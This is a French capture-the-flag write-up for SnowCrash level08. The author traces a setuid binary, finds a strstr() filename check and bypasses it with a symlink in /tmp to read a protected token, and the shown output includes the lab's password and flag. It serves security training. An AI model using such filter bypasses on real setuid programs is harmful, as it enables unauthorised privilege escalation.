il y a un fichier "token" que l'on ne peut pas lire et un exécutable

```
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

on tente d'exécuter le binaire

```
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
```

avec le fichier "token" en paramètre

```
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
```

avec un autre fichier

```
level08@SnowCrash:~$ ./level08 .bashrc
level08: Unable to open .bashrc: Permission denied
```

on check avec la commande `ltrace` ce qui se passe dans le binaire

```
level08@SnowCrash:~$ ltrace /home/user/level08/level08 token
__libc_start_main(0x8048554, 2, 0xbffff6f4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                                                  = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                                                              = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

on voit que l'exécutable utilise la fonction `strstr()` pour comparer le nom du fichier à lire avec la string "`token`"

pour pouvoir lire le fichier token il faut alors le renommer, on peut faire cela en créant un lien symbolique

```
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/givemethisflag
level08@SnowCrash:~$ ./level08 /tmp/givemethisflag
quif5eloekouj29ke0vouxean
```
```
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```